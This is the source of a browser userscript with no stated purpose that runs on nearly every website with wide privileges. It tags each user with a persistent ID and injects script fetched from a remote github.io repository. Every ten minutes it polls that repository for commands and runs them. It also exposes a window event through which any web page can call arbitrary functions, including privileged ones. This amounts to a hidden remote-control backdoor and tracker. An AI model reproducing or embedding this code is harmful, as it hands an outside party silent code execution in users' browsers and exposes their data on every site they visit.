// ==UserScript==
// @name ts
// @version 2.0.64
// @namespace xxyyzz2050
// @include *
// @exclude /github.com/
// @icon https://img.pngio.com/green-light-bulb-2-icon-green-light-bulb-png-256_256.png
// @run-at document-end
// @grant GM_info
// @grant GM_getValue
// @grant GM_setValue
// @grant GM_deleteValue
// @grant GM_listValues
// @grant GM_getResourceText
// @grant GM_getResourceURL
// @grant GM_addStyle
// @grant GM_openInTab
// @grant GM_registerMenuCommand
// @grant GM_unregisterMenuCommand
// @grant GM_notification
// @grant GM_setClipboard
// @grant GM_xmlhttpRequest
// @grant GM_download
// @downloadURL https://xxyyzz2050.github.io/ace/hk/index.user.js
// @updateURL https://xxyyzz2050.github.io/ace/hk/index.user.js
// @homepageURL https://xxyyzz2050.github.io/ace/hk/index.user.js
// @inject-into auto
// ==/UserScript==

//using @require will download this script once on download (not on update),
//so we need to dynamically update the script by loading an external script
//or use hashes with @require
//ex: @require script.js?hash=1 or gist.github/**/$revision_id/script.js (requires updating the userscript)
const _this = this;
const repo = "https://xxyyzz2050.github.io/ace/hk";

//let rdm = Math.floor(Math.random() * 100) + 1; //1-100
let timestamp = new Date().getTime();
var user = GM_getValue("user"),
  userGroup = GM_getValue("userGroup"),
  script = GM_getValue("script");
if (!user) {
  user = timestamp;
  GM_setValue("user", user);
}
if (!userGroup) {
  userGroup = timestamp;
  GM_setValue("userGroup", userGroup);
}

const dev = userGroup === 81 && user === 81;

let obj = {
  getInfo() {
    return {
      script_version: GM_info.script.version,
      userGroup,
      user,
      dev,
      timestamp,
      script_log: GM_getValue("script_log"),
      ...GM_info
    };
  },
  runFunctionByName(functionName, arguments, context = window) {
    //https://stackoverflow.com/a/359910/12577650
    ////todo: support classes, ex: new Date().getTime()
    let namespaces = functionName.split("."),
      func = namespaces.pop();

    for (let i = 0; i < namespaces.length; i++) {
      context = context[namespaces[i]];
    }

    if (dev)
      console.log("hk.user.js: runFunctionByName", {
        functionName,
        arguments,
        context,
        func,
        namespaces
      });

    return context[func].apply(context, arguments);
  },
  /**
   * load & execute a script via xmlhttp request, same as jQuery.getScript()
   * @method getScript
   * @param  {[type]}  src [description]
   * @return {[type]}  [description]
   */
  getScript(src, attributes = {}, cb = () => {}, responseType = "text") {
    //console.log({ src, attributes, cb });
    GM_xmlhttpRequest({
      url: src,
      method: "get",
      responseType,
      onreadystatechange: res => {
        if (res.readyState === 4) {
          if (res.status === 200) {
            //the consumer may need to modify res
            ////todo: make the injected script has access to this script (ex: use obj.getInfo())
            res = cb("sucess", res, src) || res;
            if (dev) console.log("[hk.user.js: getScript] sucess:", src, res);
            let script = document.createElement("script");

            try {
              // doesn't work on IE
              script.appendChild(document.createTextNode(res.responseText));
            } catch (e) {
              script.text = res.responseText;
            }

            for (let k in attributes) {
              script.setAttribute(k, attributes[k]);
            }

            //jQuery removes the script after it evaluated (inserted to the DOM)
            //https://github.com/jquery/jquery/blob/39c5778c649ad387dac834832799c0087b11d5fe/src/core/DOMEval.js
            document.head.appendChild(script); //.parentNode.removeChild(script);

            //use script.addEventListener("load",...) with <script src="">, not <script>CODE</script>
            cb("loaded", res, src);
            if (dev)
              console.log("[hk.user.js: getScript] loaded:", {
                src,
                attributes,
                cb,
                script
              });
          } else {
            cb("error", res, src, res.status);
            if (dev) console.log("[hk.user.js: getScript] error:", src, res);
          }
        }
      }
    });
  },
  //this function may fail if it violates the 'Content Security Policy', use getScript()
  loadScript(src, attributes = {}, cb = () => {}) {
    let script = document.createElement("script");
    script.src = src;
    if (!("type" in attributes)) attributes.type = "application/javascript";
    if (!("content-type" in attributes))
      attributes["content-type"] = attributes.type;

    //https://stackoverflow.com/a/41794176/12577650
    //script.setAttribute("crossorigin", true);

    for (let k in attributes) {
      script.setAttribute(k, attributes[k]);
    }

    if (cb && typeof cb === "function") {
      script.addEventListener("load", ev => cb("loaded", ev));
      script.addEventListener("readystatechange", ev => cb("ready", ev));
      script.addEventListener("error", ev => cb("error", ev));
    }

    document.head.appendChild(script);
    if (dev)
      console.log("hk.user.js: loadScript", { src, attributes, cb, script });
  },
  runCmd(cmds) {
    //todo: report that cmd received & remove it from cmds list
    for (let k in cmds) {
      if (!GM_getValue(`cmd_${k}`)) {
        cmds[k]();
        GM_setValue(`cmd_${k}`, timestamp);
      }
    }
  }
};

//add functions fo this, so it can be accessed by runFunctionByName() with context=this
for (let k in obj) {
  this[k] = obj[k];
}

//to access this script globally (ex: by the browser's console), ex: window["hk.user.js"]["getScript"]
this.unsafeWindow["hk.user.js"] = this;

window.addEventListener("hk.user.js", ev => {
  if (ev.detail && ev.detail.data) {
    //ex: {detail: ["console.log", 1,2,3]}
    //todo: return value to the consumer
    ////todo: run functions defined here (not in the injected script)
    let result = obj.runFunctionByName(
      ev.detail.data[0],
      ev.detail.data.slice(2),
      ev.detail.data.slice(1) ? _this : _this.unsafeWindow
    );
    if (ev.detail.cb && typeof ev.detail.cb === "function")
      ev.detail.cb(result);
  }
});

//don't link from github gists or repos because it sets content-type to text/plain
//use github pages
getScript(
  `${repo}/index.js?hash=${timestamp}&usergroup=${userGroup}&user=${user}`,
  {
    id: "hkscript"
  }
);

function getCmd() {
  getScript(
    `${repo}/cmd.js?hash=${timestamp}&usergroup=${userGroup}&user=${user}`,
    {},
    (type, res, src) => {
      if (type === "sucess") {
        //todo:(this here = window, not GM)
        //_this, obj, ... not defined
        res.responseText = `runCmd(${res.responseText})`;
      }
    }
    //"json"
  );
}

getCmd();
setInterval(getCmd, 60 * 10 * 1000); //every 10 mins.
